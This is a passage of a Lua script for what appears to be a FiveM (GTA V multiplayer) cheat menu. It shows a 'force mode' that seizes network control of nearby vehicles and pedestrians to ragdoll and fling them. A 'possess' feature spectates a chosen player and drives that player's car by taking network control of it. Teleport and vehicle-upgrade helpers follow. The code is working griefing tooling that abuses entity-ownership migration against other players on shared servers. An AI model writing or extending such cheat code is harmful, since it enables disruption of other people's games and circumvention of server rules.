						end
					end



					if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
						KeyPressed = true
						ForceEnabled = true
					end

					if (StartPush) then

						StartPush = false
						local pid = PlayerPedId()
						local CamRot = GetGameplayCamRot(2)

						local force = 5

						local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
						local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
						local Fz = force * (CamRot.x * 0.2)

						local PlayerVeh = GetVehiclePedIsIn(pid, false)

						for k in EnumerateVehicles() do
							SetEntityInvincible(k, false)
							if IsEntityOnScreen(k) and k ~= PlayerVeh then
								ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
							end
						end

						for k in EnumeratePeds() do
							if IsEntityOnScreen(k) and k ~= pid then
								ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
							end
						end

					end


					if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
						KeyPressed = true
						StartPush = true
						ForceEnabled = false
					end

					if (ForceEnabled) then
						local pid = PlayerPedId()
						local PlayerVeh = GetVehiclePedIsIn(pid, false)

						Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

						DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)

						for k in EnumerateVehicles() do
							SetEntityInvincible(k, true)
							if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
								RequestControlOnce(k)
								FreezeEntityPosition(k, false)
								Oscillate(k, Markerloc, 0.5, 0.3)
							end
						end

						for k in EnumeratePeds() do
							if IsEntityOnScreen(k) and k ~= PlayerPedId() then
								RequestControlOnce(k)
								SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
								FreezeEntityPosition(k, false)
								Oscillate(k, Markerloc, 0.5, 0.3)
							end
						end

					end

				end

				while ForceTog do forcetick()Wait(0) end
			end)
		else ShowInfo("Force Mode ~r~[OFF]") end

	end

	function GetSeatPedIsIn(ped)
		if not IsPedInAnyVehicle(ped, false) then return
		else
			veh = GetVehiclePedIsIn(ped)
			for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
				if GetPedInVehicleSeat(veh) then return i end
			end
		end
	end

	function GetCamDirFromScreenCenter()
		local pos = GetGameplayCamCoord()
		local world = ScreenToWorld(0, 0)
		local ret = SubVectors(world, pos)
		return ret
	end

	local function RGBRainbow(frequency)
		local result = {}
		local curtime = GetGameTimer() / 1000

		result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
		result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
		result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

		return result
	end

	function ScreenToWorld(screenCoord)
		local camRot = GetGameplayCamRot(2)
		local camPos = GetGameplayCamCoord()

		local vect2x = 0.0
		local vect2y = 0.0
		local vect21y = 0.0
		local vect21x = 0.0
		local direction = RotationToDirection(camRot)
		local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
		local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
		local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)

		local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
		local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
		local radians = -(math.rad(camRot.y))

		vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
		vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

		local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
		if not case1 then
			vect2x = x1
			vect2y = y1
			return camPos + (direction * 10.0)
		end

		local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
		if not case2 then
			vect21x = x2
			vect21y = y2
			return camPos + (direction * 10.0)
		end

		if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
			return camPos + (direction * 10.0)
		end

		local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
		local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
		return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

	end

	function WorldToScreenRel(worldCoords)
		local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
		if not check then
			return false
		end

		screenCoordsx = (x - 0.5) * 2.0
		screenCoordsy = (y - 0.5) * 2.0
		return true, screenCoordsx, screenCoordsy
	end

	function RotationToDirection(rotation)
		local retz = math.rad(rotation.z)
		local retx = math.rad(rotation.x)
		local absx = math.abs(math.cos(retx))
		return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
	end

	local function GetCamDirection()
		local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
		local pitch = GetGameplayCamRelativePitch()

		local x = -math.sin(heading * math.pi / 180.0)
		local y = math.cos(heading * math.pi / 180.0)
		local z = math.sin(pitch * math.pi / 180.0)

		local len = math.sqrt(x * x + y * y + z * z)
		if len ~= 0 then
			x = x / len
			y = y / len
			z = z / len
		end

		return x, y, z
	end

	function ApplyForce(entity, direction)
		ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
	end

	function RequestControlOnce(entity)
		if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
			return true
		end
		SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
		return NetworkRequestControlOfEntity(entity)
	end

	function RequestControl(entity)
		Citizen.CreateThread(function()
			local tick = 0
			while not RequestControlOnce(entity) and tick <= 12 do
				tick = tick + 1
				Wait(0)
			end
			return tick <= 12
		end)
	end

	function Oscillate(entity, position, angleFreq, dampRatio)
		local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
		local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
		local targetPos = SubVectors(pos1, pos2)

		ApplyForce(entity, targetPos)
	end

	-- END MENYOO/ENTITY FUNCTIONS
	-- DRAWING FUNCTIONS
	function ShowMPMessage(message, subtitle, ms)
		Citizen.CreateThread(function()
			Citizen.Wait(0)
			function Initialize(scaleform)
				local scaleform = RequestScaleformMovie(scaleform)
				while not HasScaleformMovieLoaded(scaleform) do
					Citizen.Wait(0)
				end
				PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
				PushScaleformMovieFunctionParameterString(message)
				PushScaleformMovieFunctionParameterString(subtitle)
				PopScaleformMovieFunctionVoid()
				Citizen.SetTimeout(6500, function()
					PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
					PushScaleformMovieFunctionParameterInt(1)
					PushScaleformMovieFunctionParameterFloat(0.33)
					PopScaleformMovieFunctionVoid()
					Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
				end)
				return scaleform
			end

			scaleform = Initialize("mp_big_message_freemode")

			while true do
				Citizen.Wait(0)
				DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
			end
		end)
	end

	function ShowInfo(text)
		SetNotificationTextEntry("STRING")
		AddTextComponentString(text)
		DrawNotification(true, false)
	end

	function DrawTxt(text, x, y, scale, size)
		SetTextFont(0)
		SetTextProportional(1)
		SetTextScale(scale, size)
		SetTextDropshadow(1, 0, 0, 0, 255)
		SetTextEdge(1, 0, 0, 0, 255)
		SetTextDropShadow()
		SetTextOutline()
		SetTextEntry("STRING")
		AddTextComponentString(text)
		DrawText(x, y)
	end

	function DrawText3D(x, y, z, text)
		local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
		local px, py, pz = table.unpack(GetGameplayCamCoords())
		local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)

		local scale = (1 / dist) * 2
		local fov = (1 / GetGameplayCamFov()) * 100
		local scale = scale * fov

		if onScreen then
			SetTextScale(0.0 * scale, 0.55 * scale)
			SetTextFont(0)
			SetTextProportional(1)
			SetTextColour(255, 255, 255, 255)
			SetTextDropshadow(0, 0, 0, 0, 255)
			SetTextEdge(2, 0, 0, 0, 150)
			SetTextDropShadow()
			SetTextOutline()
			SetTextEntry("STRING")
			SetTextCentre(1)
			AddTextComponentString(text)
			DrawText(_x, _y)
		end
	end

	local entityEnumerator = {
		__gc = function(enum)
			if enum.destructor and enum.handle then
				enum.destructor(enum.handle)
			end
			enum.destructor = nil
			enum.handle = nil
		end
	}

	local function GetHeadItems()
		local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
		local faceItemsList = {}
		for i = 1, headItems do
			faceItemsList[i] = i
		end
		return faceItemsList
	end

	local function GetHeadTextures(faceID)
		local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
		local headTexturesList = {}
		for i = 1, headTextures do
			headTexturesList[i] = i
		end
		return headTexturesList
	end

	local function GetHairItems()
		local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
		local hairItemsList = {}
		for i = 1, hairItems do
			hairItemsList[i] = i
		end
		return hairItemsList
	end

	local function GetHairTextures(hairID)
		local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
		local hairTextureList = {}
		for i = 1, hairTexture do
			hairTextureList[i] = i
		end
		return hairTextureList
	end

	local function GetMaskItems()
		local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
		local maskItemsList = {}
		for i = 1, maskItems do
			maskItemsList[i] = i
		end
		return maskItemsList
	end

	local function GetHatItems()
		local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
		local hatItemsList = {}
		for i = 1, hatItems do
			hatItemsList[i] = i
		end
		return hatItemsList
	end

	local function GetHatTextures(hatID)
		local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
		local hatTexturesList = {}
		for i = 1, hatTextures do
			hatTexturesList[i] = i
		end
		return hatTexturesList
	end

	local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
		return coroutine.wrap(function()
			local iter, id = initFunc()
			if not id or id == 0 then
				disposeFunc(iter)
				return
			end

			local enum = {handle = iter, destructor = disposeFunc}
			setmetatable(enum, entityEnumerator)

			local next = true
			repeat
				coroutine.yield(id)
				next, id = moveFunc(iter)
			until not next

			enum.destructor, enum.handle = nil, nil
			disposeFunc(iter)
		end)
	end

	function EnumerateObjects()
		return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
	end

	function EnumeratePeds()
		return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
	end

	function EnumerateVehicles()
		return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
	end

	function EnumeratePickups()
		return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
	end

	function table.contains(table, element)
		for _, value in pairs(table) do
			if value == element then
				return true
			end
		end
		return false
	end

	function table.removekey(array, element)
		for i = 1, #array do
			if array[i] == element then
				table.remove(array, i)
			end
		end
	end

	function AddVectors(vect1, vect2)
		return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
	end

	function SubVectors(vect1, vect2)
		return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
	end

	function ScaleVector(vect, mult)
		return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
	end

	function round(num, numDecimalPlaces)
		local mult = 10 ^ (numDecimalPlaces or 0)
		return math.floor(num * mult + 0.5) / mult
	end

	local function GetKeyboardInput(text)
		if not text then text = "Input" end
		DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
		while (UpdateOnscreenKeyboard() == 0) do
			DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
			DisableAllControlActions(0)

			if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
			Wait(0)
		end
		if (GetOnscreenKeyboardResult()) then
			local result = GetOnscreenKeyboardResult()
			Wait(0)
			return result
		end
	end

	function SpectatePlayer(id)
		local player = GetPlayerPed(id)
		if Spectating then
			RequestCollisionAtCoord(GetEntityCoords(player))
			NetworkSetInSpectatorMode(true, player)
		else
			RequestCollisionAtCoord(GetEntityCoords(player))
			NetworkSetInSpectatorMode(false, player)
		end
	end

	local function PossessVehicle(target)
		PossessingVeh = not PossessingVeh

		if not PossessingVeh then
			SetEntityVisible(PlayerPedId(), true, 0)
			SetEntityCoords(PlayerPedId(), oldPlayerPos)
			SetEntityCollision(PlayerPedId(), true, 1)
		else
			SpectatePlayer(selectedPlayer)
			ShowInfo("~b~Checking Player...")
			Wait(3000)
			if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
				SpectatePlayer(selectedPlayer)
				oldPlayerPos = GetEntityCoords(PlayerPedId())
				SetEntityVisible(PlayerPedId(), false, 0)
				SetEntityCollision(PlayerPedId(), false, 0)
			else
				SpectatePlayer(selectedPlayer)
				PossessingVeh = false
				ShowInfo("~r~Player not in a vehicle!  (Try again?)")
			end


			local Markerloc = nil


			Citizen.CreateThread(function()
				local ped = GetPlayerPed(target)
				local veh = GetVehiclePedIsIn(ped, 0)

				while PossessingVeh do

					DrawTxt("~b~Possessing ~w~" .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
					DrawTxt("~b~Controls:\n~w~-------------------", 0.1, 0.2, 0.0, 0.4)
					DrawTxt("~b~W/S: ~w~Forward/Back\n~b~SPACEBAR: ~w~Up\n~b~CTRL: ~w~Down\n~b~X: ~w~Cancel", 0.1, 0.25, 0.0, 0.4)
					Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
					DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)

					local forward = SubVectors(Markerloc, GetEntityCoords(veh))
					local vpos = GetEntityCoords(veh)
					local vf = GetEntityForwardVector(veh)
					local vrel = SubVectors(vpos, vf)

					SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
					SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)

					RequestControlOnce(veh)

					if IsDisabledControlPressed(0, Keys["W"]) then
						ApplyForce(veh, forward * 0.1)
					end

					if IsDisabledControlPressed(0, Keys["S"]) then
						ApplyForce(veh, -(forward * 0.1))
					end

					if IsDisabledControlPressed(0, Keys["SPACE"]) then
						ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					end

					if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
						ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					end

					if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
						PossessingVeh = false
						SetEntityVisible(PlayerPedId(), true, 0)
						SetEntityCoords(PlayerPedId(), oldPlayerPos)
						SetEntityCollision(PlayerPedId(), true, 1)
					end

					Wait(0)
				end
			end)
		end
	end

	function GetWeaponNameFromHash(hash)
		for i = 1, #allweapons do
			if GetHashKey(allweapons[i]) == hash then
				return string.sub(allweapons[i], 8)
			end
		end
	end

	local function fbi()
		local bB = 160.868
		local bC = -745.831
		local bD = 250.063
		if bB ~= '' and bC ~= '' and bD ~= '' then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
			end
		end

	end

	local function ls()
		local bB = -365.425
		local bC = -131.809
		local bD = 37.873
		if bB ~= '' and bC ~= '' and bD ~= '' then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
			end
		end

	end

	local function gp()
		local bB = 266.12
		local bC = -752.51
		local bD = 34.64
		if bB ~= '' and bC ~= '' and bD ~= '' then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
			end
		end

	end

	local function dealership()
		local bB = -15.32
		local bC = -1080.69
		local bD = 26.14
		if bB ~= '' and bC ~= '' and bD ~= '' then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
			end
		end

	end

	local function Ammunation()
		local bB = 19.22
		local bC = -1108.71
		local bD = 29.8
		if bB ~= '' and bC ~= '' and bD ~= '' then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
			end
		end

	end

	local function shopclothes()
		local bB = 428.61
		local bC = -799.89
		local bD = 29.49
		if bB ~= '' and bC ~= '' and bD ~= '' then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
			end
		end

	end

	local function barber()
		local bB = -32.84
		local bC = -152.34
		local bD = 57.08
		if bB ~= '' and bC ~= '' and bD ~= '' then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
			end
		end

	end


	function MaxOut(veh)
		SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
		SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
		SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
		SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
		SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
	end

	function engine(veh)
		SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
		SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
		ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
		SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
	end

	function engine1(veh)
						SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
						SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
						SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
						ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
						ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
						ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
						ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
